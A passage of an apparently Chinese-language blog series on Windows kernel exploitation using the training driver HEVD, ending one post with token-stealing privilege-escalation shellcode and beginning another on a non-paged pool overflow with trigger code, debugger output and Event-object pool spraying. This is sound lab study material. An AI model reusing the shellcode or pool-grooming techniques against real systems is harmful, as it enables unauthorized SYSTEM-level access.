class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]Success to alloc zero page...\n"</span>);</span><br><span class="line">*(DWORD*)(<span class="number">0x4</span>) = (DWORD)&amp; ShellCode;</span><br></pre></td></tr></table></figure>
<p>shellcode还是注意需要堆栈的平衡，不然可能就会蓝屏，有趣的是，我在不同的地方测试的效果不一样，也就是说在运行exp之前虚拟机的状态不一样的话，可能效果会不一样(这一点我深有体会)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> VOID <span class="title">ShellCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		pop edi</span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]		<span class="comment">// Find the _KTHREAD structure for the current thread</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>]   <span class="comment">// Find the _EPROCESS structure</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span>				<span class="comment">// edx = system PID(4)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// The loop is to get the _EPROCESS of the system</span></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0xb8</span>]	<span class="comment">// Find the process activity list</span></span><br><span class="line">					 sub eax, <span class="number">0xb8</span>    		<span class="comment">// List traversal</span></span><br><span class="line">					 cmp[eax + <span class="number">0xb4</span>], edx    <span class="comment">// Determine whether it is SYSTEM based on PID</span></span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 <span class="comment">// Replace the Token</span></span><br><span class="line">					 mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">					 mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">					 popad</span><br><span class="line">					 <span class="comment">//int 3</span></span><br><span class="line">					 ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后我们整合一下代码就可以提权了，总结一下步骤</p>
<ul>
<li>初始化句柄等结构</li>
<li>申请0页内存并放入shellcode位置</li>
<li>调用<code>TriggerNullPointerDereference</code>函数</li>
<li>调用cmd提权</li>
</ul>
<p>提权效果如下，详细的代码参考<a href="https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Null-Pointer-Dereference/Null-Pointer-Dereference/Null-Pointer-Dereference.c" target="_blank" rel="noopener">这里</a></p>
<p><img src="/2019/07/28/Windows-Kernel-Exploit-内核漏洞学习-5-Null-Pointer-Dereference/test.gif" alt="test"></p>
<h1 id="0x03：后记"><a href="#0x03：后记" class="headerlink" title="0x03：后记"></a>0x03：后记</h1><p>这个漏洞相对上一个算是很简单的了，上一个漏洞如果你很清楚的话这一个做起来就会很快，如果要学习相应的CVE可以参考CVE-2018-8120</p>
]]></content>
      <categories>
        <category>Windows Kernel</category>
      </categories>
      <tags>
        <tag>Windows Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-内核漏洞学习(4)-PoolOverflow</title>
    <url>/2019/07/28/Windows-Kernel-Exploit-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-4-PoolOverflow/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这是 Windows kernel exploit 系列的第四部分，前一篇我们讲了任意内存覆盖漏洞，这一篇我们讲内核池溢出漏洞，这一篇篇幅虽然可能不会很多，但是需要很多的前置知识，也就是说，我们需要对Windows内存分配机制有一个深入的理解，我的建议是先看《0day安全：软件漏洞分析技术第二版》中的第五章堆溢出利用，里面很详细的讲解了堆的一些机制，但是主要讨论的是 Windows 2000～Windows XP SP1 平台的堆管理策略，看完了之后，类比堆溢出利用你可以看 Tarjei Mandt 写的 Kernel Pool Exploitation on Windows 7 ，因为我们的实验平台是 Windows 7 的内核池，所以我们需要对内核池深入的理解，虽然是英文文档，但是不要惧怕，毕竟我花了一周的时间才稍微读懂了其中的一些内容(这也是这一篇更新比较慢的原因)，总之这个过程是漫长的，并不是一两天就能搞定的，话不多说，进入正题，看此文章之前你需要有以下准备：</p>
<ul>
<li>Windows 7 x86 sp1虚拟机</li>
<li>配置好windbg等调试工具，建议配合VirtualKD使用</li>
<li>HEVD+OSR Loader配合构造漏洞环境</li>
</ul>
<h1 id="0x01：漏洞原理"><a href="#0x01：漏洞原理" class="headerlink" title="0x01：漏洞原理"></a>0x01：漏洞原理</h1><h2 id="池溢出原理"><a href="#池溢出原理" class="headerlink" title="池溢出原理"></a>池溢出原理</h2><p>我们暂时先不看源码，先用IDA分析<code>HEVD.sys</code>，我们找到<code>TriggerPoolOverflow</code>函数，先静态分析一下函数在干什么，可以看到，函数首先用<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-exallocatepoolwithtag" target="_blank" rel="noopener"><code>ExAllocatePoolWithTag</code></a>函数分配了一块非分页内存池，然后将一些信息打印出来，又验证缓冲区是否驻留在用户模式下，然后用<a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=vs-2019" target="_blank" rel="noopener"><code>memcpy</code></a>函数将<code>UserBuffer</code>拷贝到<code>KernelBuffer</code>，这和内核栈溢出有点似曾相识的感觉，同样的拷贝，同样的没有控制Size的大小，只是一个是栈溢出一个是池溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TriggerPoolOverflow</span><span class="params">(<span class="keyword">void</span> *UserBuffer, <span class="keyword">unsigned</span> <span class="keyword">int</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  PVOID KernelBuffer; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  DbgPrint(<span class="string">"[+] Allocating Pool chunk\n"</span>);</span><br><span class="line">  KernelBuffer = ExAllocatePoolWithTag(<span class="number">0</span>, <span class="number">0x1F8</span>u, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( KernelBuffer )</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, <span class="string">"'kcaH'"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Type: %s\n"</span>, <span class="string">"NonPagedPool"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Size: 0x%X\n"</span>, <span class="number">0x1F8</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, KernelBuffer);</span><br><span class="line">    ProbeForRead(UserBuffer, <span class="number">0x1F8</span>u, <span class="number">1u</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] UserBuffer: 0x%p\n"</span>, UserBuffer);</span><br><span class="line">    DbgPrint(<span class="string">"[+] UserBuffer Size: 0x%X\n"</span>, Size);</span><br><span class="line">    DbgPrint(<span class="string">"[+] KernelBuffer: 0x%p\n"</span>, KernelBuffer);</span><br><span class="line">    DbgPrint(<span class="string">"[+] KernelBuffer Size: 0x%X\n"</span>, <span class="number">0x1F8</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Triggering Pool Overflow\n"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(KernelBuffer, UserBuffer, Size);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Freeing Pool chunk\n"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Tag: %s\n"</span>, <span class="string">"'kcaH'"</span>);</span><br><span class="line">    DbgPrint(<span class="string">"[+] Pool Chunk: 0x%p\n"</span>, KernelBuffer);</span><br><span class="line">    ExFreePoolWithTag(KernelBuffer, <span class="number">0x6B636148</span>u);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">"[-] Unable to allocate Pool chunk\n"</span>);</span><br><span class="line">    result = <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>漏洞的原理很简单，就是没有控制好传入Size的大小，为了更清楚的了解漏洞原理，我们分析一下源码文件<code>BufferOverflowNonPagedPool.c</code>，定位到关键点的位置，也就是说，安全的操作始终对分配的内存有严格的控制</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of the allocated pool chunk to RtlCopyMemory()/memcpy().</span></span><br><span class="line">        <span class="comment">// Hence, there will be no overflow</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory(KernelBuffer, UserBuffer, (SIZE_T)POOL_BUFFER_SIZE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">"[+] Triggering Buffer Overflow in NonPagedPool\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla pool buffer overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied value directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of the allocated Pool chunk</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory(KernelBuffer, UserBuffer, Size);</span><br></pre></td></tr></table></figure>
<h1 id="0x02：漏洞利用"><a href="#0x02：漏洞利用" class="headerlink" title="0x02：漏洞利用"></a>0x02：漏洞利用</h1><h2 id="控制码"><a href="#控制码" class="headerlink" title="控制码"></a>控制码</h2><p>漏洞的原理我们已经清楚了，但是关键点还是在利用上，内核池这个东西利用起来就不像栈一样那么简单了，我们还是一步一步的构造我们的exploit吧，首先根据上一篇的经验我们知道如何计算控制码从而调用<code>TriggerPoolOverflow</code>函数，首先找到<code>HackSysExtremeVulnerableDriver.h</code>中定义<code>IOCTL</code>的地方，找到我们对应的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)</span></span><br></pre></td></tr></table></figure>
<p>然后我们用python计算一下控制码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex((<span class="number">0x00000022</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0x00000000</span> &lt;&lt; <span class="number">14</span>) | (<span class="number">0x803</span> &lt;&lt; <span class="number">2</span>) | <span class="number">0x00000003</span>)</span><br><span class="line"><span class="string">'0x22200f'</span></span><br></pre></td></tr></table></figure>
<p>我们验证一下我们的代码，我们先给buf一个比较小的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to get HANDLE!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlFillMemory(buf, <span class="number">8</span>, <span class="number">0x41</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22200f</span>, buf, <span class="number">8</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行一下如我们所愿调用了<code>TriggerPoolOverflow</code>函数，另外我们可以发现 Pool  Size 有 0x1F8(504) 的大小(如果你细心的话其实在IDA中也能看到，另外你可以尝试着多传入几个字节的大小破坏下一块池头的内容，看看是否会蓝屏)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x8674B610</span><br><span class="line">[+] UserBuffer: 0x001BFB58</span><br><span class="line">[+] UserBuffer Size: 0x8</span><br><span class="line">[+] KernelBuffer: 0x8674B610</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Pool Overflow</span><br><span class="line">[+] Freeing Pool chunk</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Chunk: 0x8674B610</span><br><span class="line">****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******</span><br></pre></td></tr></table></figure>
<p>我们现在需要了解内核池分配的情况，所以我们需要在拷贝函数执行之前下断点观察，我们把 buf 设为 0x1F8 大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; u 8D6A320B // 反编译查看断点位置是否下对</span><br><span class="line">HEVD!TriggerPoolOverflow+0xe1 [c:\hacksysextremevulnerabledriver\driver\pooloverflow.c @ 113]:</span><br><span class="line">8d6a320b e8cacfffff      call    HEVD!memcpy (8d6a01da)</span><br><span class="line">8d6a3210 686c436a8d      push    offset HEVD! ?? ::NNGAKEGL::`string&apos; (8d6a436c)</span><br><span class="line">8d6a3215 e8eccdffff      call    HEVD!DbgPrint (8d6a0006)</span><br><span class="line">8d6a321a 6834446a8d      push    offset HEVD! ?? ::NNGAKEGL::`string&apos; (8d6a4434)</span><br><span class="line">8d6a321f 53              push    ebx</span><br><span class="line">8d6a3220 e8e1cdffff      call    HEVD!DbgPrint (8d6a0006)</span><br><span class="line">8d6a3225 ff75e4          push    dword ptr [ebp-1Ch]</span><br><span class="line">8d6a3228 57              push    edi</span><br><span class="line">1: kd&gt; ba e1 8D6A320B // 下硬件执行断点</span><br><span class="line">1: kd&gt; g</span><br><span class="line">****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x88CAAA90</span><br><span class="line">[+] UserBuffer: 0x001FF82C</span><br><span class="line">[+] UserBuffer Size: 0x1F8</span><br><span class="line">[+] KernelBuffer: 0x88CAAA90</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Pool Overflow</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerPoolOverflow+0xe1:</span><br><span class="line">8c6d120b e8cacfffff      call    HEVD!memcpy (8c6ce1da)</span><br></pre></td></tr></table></figure>
<p>我们可以用<code>!pool address</code>命令查看address周围地址处的池信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !pool 0x88CAAA90</span><br><span class="line">Pool page 88caaa90 region is Nonpaged pool</span><br><span class="line"> 88caa000 size:  118 previous size:    0  (Allocated)  AfdE (Protected)</span><br><span class="line"> 88caa118 size:    8 previous size:  118  (Free)       Ipng</span><br><span class="line"> 88caa120 size:   68 previous size:    8  (Allocated)  EtwR (Protected)</span><br><span class="line"> 88caa188 size:  2e8 previous size:   68  (Free)       Thre</span><br><span class="line"> 88caa470 size:  118 previous size:  2e8  (Allocated)  AfdE (Protected)</span><br><span class="line"> 88caa588 size:  190 previous size:  118  (Free)       AleD</span><br><span class="line"> 88caa718 size:   68 previous size:  190  (Allocated)  EtwR (Protected)</span><br><span class="line"> 88caa780 size:   48 previous size:   68  (Allocated)  Vad </span><br><span class="line"> 88caa7c8 size:   30 previous size:   48  (Allocated)  NpFn Process: 88487d40</span><br><span class="line"> 88caa7f8 size:   f8 previous size:   30  (Allocated)  MmCi</span><br><span class="line"> 88caa8f0 size:   48 previous size:   f8  (Allocated)  Vad </span><br><span class="line"> 88caa938 size:  138 previous size:   48  (Allocated)  ALPC (Protected)</span><br><span class="line"> 88caaa70 size:   18 previous size:  138  (Allocated)  CcWk</span><br><span class="line">*88caaa88 size:  200 previous size:   18  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 88caac88 size:   20 previous size:  200  (Allocated)  ReTa</span><br><span class="line"> 88caaca8 size:  190 previous size:   20  (Free)       AleD</span><br><span class="line"> 88caae38 size:  1c8 previous size:  190  (Allocated)  AleE</span><br></pre></td></tr></table></figure>
<p>我们查看我们申请到池的末尾，0x41414141之后就是下一个池的池首，我们待会主要的目的就是修改下一个池首的内容，从而运行我们shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; dd 88caac88-8</span><br><span class="line">88caac80  41414141 41414141 04040040 61546552</span><br><span class="line">88caac90  00000000 00000003 00000000 00000000</span><br><span class="line">88caaca0  00000000 00000000 00320004 44656c41</span><br><span class="line">88caacb0  884520c8 88980528 00000011 00000000</span><br><span class="line">88caacc0  01100802 00000080 760e0002 000029c7</span><br><span class="line">88caacd0  873e2ae0 873e2ae0 e702b9dd 00000000</span><br><span class="line">88caace0  00000164 00000000 00000000 00000001</span><br><span class="line">88caacf0  00000000 00000100 88caacb0 8969ae1b</span><br></pre></td></tr></table></figure>
<h2 id="Event-Object"><a href="#Event-Object" class="headerlink" title="Event Object"></a>Event Object</h2><p>从上面的池分布信息可以看到周围的池分布是很杂乱无章的，我们希望是能够控制我们内核池的分布，从源码中我们已经知道，我们的漏洞点是产生在非分页池中的，所以我们需要一个函数像malloc一样申请在我们的内核非分页池中，我们这里使用的是<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/synchapi/nf-synchapi-createeventa" target="_blank" rel="noopener"><code>CreateEventA</code></a>，函数原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEventA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSECURITY_ATTRIBUTES lpEventAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bManualReset,</span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL                  bInitialState,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR                lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该函数会生成一个<a href="https://docs.microsoft.com/zh-cn/windows/win32/sync/event-objects" target="_blank" rel="noopener"><code>Event</code></a>事件对象，它的大小为 0x40 ，因为在刚才的调试中我们知道我们的池大小为 <code>0x1f8 + 8 = 0x200</code>，所以多次申请就刚好可以填满我们的池，如果把池铺满成我们的Event对象，我们再用<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/handleapi/nf-handleapi-closehandle" target="_blank" rel="noopener"><code>CloseHandle</code></a>函数释放一些对象，我们就可以在Event中间留出一些我们可以操控的空间，我们构造如下代码测试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// Get HANDLE</span></span><br><span class="line">	hDevice = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to get HANDLE...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Success to get HANDLE!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE spray_event[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">pool_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">		spray_event[i] = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD bReturn = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">504</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	RtlFillMemory(buf, <span class="number">504</span>, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (init() == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+]Failed to get HANDLE!!!\n"</span>);</span><br><span class="line">		system(<span class="string">"pause"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pool_spray();</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x22200f</span>, buf, <span class="number">504</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;bReturn, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__debugbreak();</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，我们已经把内核池铺成了我们希望的样子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">****** HACKSYS_EVD_IOCTL_POOL_OVERFLOW ******</span><br><span class="line">[+] Allocating Pool chunk</span><br><span class="line">[+] Pool Tag: &apos;kcaH&apos;</span><br><span class="line">[+] Pool Type: NonPagedPool</span><br><span class="line">[+] Pool Size: 0x1F8</span><br><span class="line">[+] Pool Chunk: 0x86713A08</span><br><span class="line">[+] UserBuffer: 0x0032FB1C</span><br><span class="line">[+] UserBuffer Size: 0x1F8</span><br><span class="line">[+] KernelBuffer: 0x86713A08</span><br><span class="line">[+] KernelBuffer Size: 0x1F8</span><br><span class="line">[+] Triggering Pool Overflow</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerPoolOverflow+0xe1:</span><br><span class="line">8c6d120b e8cacfffff      call    HEVD!memcpy (8c6ce1da)</span><br><span class="line">kd&gt; !pool 0x86713A08</span><br><span class="line">Pool page 86713a08 region is Nonpaged pool</span><br><span class="line"> 86713000 size:   40 previous size:    0  (Allocated)  Even (Protected)</span><br><span class="line"> 86713040 size:   10 previous size:   40  (Free)       ....</span><br><span class="line"> 86713050 size:   48 previous size:   10  (Allocated)  Vad </span><br><span class="line"> 86713098 size:   48 previous size:   48  (Allocated)  Vad </span><br><span class="line"> 867130e0 size:   40 previous size:   48  (Allocated)  Even (Protected)</span><br><span class="line"> 86713120 size:   28 previous size:   40  (Allocated)  WfpF</span><br><span class="line"> 86713148 size:   28 previous size:   28  (Allocated)  WfpF</span><br><span class="line"> 86713170 size:  890 previous size:   28  (Free)       NSIk</span><br><span class="line">*86713a00 size:  200 previous size:  890  (Allocated) *Hack</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> 86713c00 size:   40 previous size:  200  (Allocated)  Even (Protected)</span><br><span class="line"> 86713c40 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713c80 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713cc0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713d00 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713d40 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713d80 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713dc0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713e00 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713e40 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713e80 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713ec0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713f00 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713f40 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713f80 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br><span class="line"> 86713fc0 size:   40 previous size:   40  (Allocated)  Even (Protected)</span><br></pre></td></tr></table></figure>
<p>接下来我们加上<code>CloseHandle</code>函数就可以制造一些空洞了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">pool_spray</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">		spray_event[i] = CreateEventA(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 0x40 * 8 = 0x200</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">			CloseHandle(spray_event[i + j]);</span><br><span class="line">		i += <span class="number">8</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重新运行结果如下，我们已经制造了许多空洞</p>
